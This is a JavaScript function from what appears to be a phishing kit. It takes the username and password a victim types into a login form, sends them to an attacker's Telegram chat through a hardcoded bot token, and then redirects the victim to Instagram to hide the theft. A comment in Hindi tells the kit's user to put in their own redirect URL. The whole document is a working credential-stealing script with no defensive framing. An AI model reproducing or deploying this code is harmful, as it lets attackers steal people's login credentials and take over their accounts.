function sendData() {
  let username = document.getElementById("username").value;
  let password = document.getElementById("password").value;
  
  if (username === "" || password === "") {
    alert("Please enter your username and password!");
    return;
  }
  
  let botToken = "7438200543:AAGj_NH7TYovNcO4-n9saO4YCIrWf3KWeqE";
  let chatId = "6133511447";
  let message = `🔑 New Login Attempt:\n👤 Username: ${username}\n🔒 Password: ${password}`;
  
  let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
  
  fetch(url)
    .then(response => response.json())
    .then(data => {
      // ✅ Redirect to another website after sending data
      window.location.href = "https://www.instagram.com"; // ⚡ Yahan apni website ka URL daalo
    })
    .catch(error => {
      console.error("Error:", error);
    });
}